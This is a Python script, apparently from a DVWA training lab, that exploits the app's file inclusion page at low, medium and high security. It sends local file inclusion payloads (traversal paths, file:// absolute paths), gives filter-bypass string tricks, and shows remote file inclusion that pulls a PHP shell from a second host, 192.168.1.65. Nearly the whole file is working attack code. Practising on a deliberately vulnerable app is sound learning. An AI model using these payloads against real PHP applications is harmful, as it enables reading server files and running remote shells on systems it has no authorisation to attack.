"""
    File inclusion in DVWA
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

"""
You can include any type of file
Using Local File Inclusion (LFI) to include for example : exploit_low(sess, "../../hackable/flags/fi.php")
Or using Remote File Inclusion (RFI) where you prepared a php script doing whatever you want it to do so for example you can do : exploit_low(sess, "http://192.168.1.65/shell.php") 
"""
def exploit_low(sess, included_file):
    payload = included_file
    exploit = {
        "page":payload
    }
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/fi/?", params=exploit)
    print(resp.text)
def exploit_med(sess, included_file):
    payload = included_file
    payload = payload.replace("../", "..//") # Because it check only if there's one '/' For LFI
    payload = payload.replace("..\\", "..\\\\") # Because it check only if there's one '\' For LFI
    payload = payload.replace("http://", "httphttp://://") # For RFI
    payload = payload.replace("https://", "httpshttps://://") # For RFI
    exploit = {
        "page":payload
    }
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/fi/?", params=exploit)
    print(resp.text)
"""
For the high level, we have to use the file:// identifier
You have to pass an absolute path to the function, example : exploit_med(sess, "/var/www/html/dvwa/hackable/flags/fi.php")
"""
def exploit_high(sess, included_file):
    payload = "file://"
    payload += included_file
    exploit = {
        "page":payload
    }
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/fi/?", params=exploit)
    print(resp.text)

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    # exploit(sess, "http://192.168.1.65/pen/shell.php")
    exploit_high(sess, "/var/www/html/dvwa/hackable/flags/fi.php")
main()